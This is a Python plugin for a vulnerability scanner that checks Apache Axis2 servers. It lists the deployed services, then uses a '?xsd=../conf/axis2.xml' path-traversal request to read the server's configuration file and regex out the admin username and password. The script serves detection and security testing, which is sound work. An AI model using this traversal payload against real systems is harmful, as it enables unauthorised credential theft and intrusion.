#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

import re
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, [
                    './axis2/services/',
                    './axis/services/',
                    './services/',
                ]):
                    if path[-1] == '/':
                        url = path + 'listServices'
                        async with session.get(url=url) as res:
                            if res:
                                text = await res.text()
                                m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', text)
                                if m != None and m.group(1):
                                    server_str = m.group(1)
                                    read_url = path + '/%s?xsd=../conf/axis2.xml' % (server_str)
                                    async with session.get(url=read_url) as res1:
                                        if res1:
                                            text1 = await res1.text()
                                            if 'axisconfig' in str(text1):
                                                user = re.search('<parameter name="userName">(.*?)</parameter>', text)
                                                password = re.search('<parameter name="password">(.*?)</parameter>', text)
                                                yield read_url
                                                return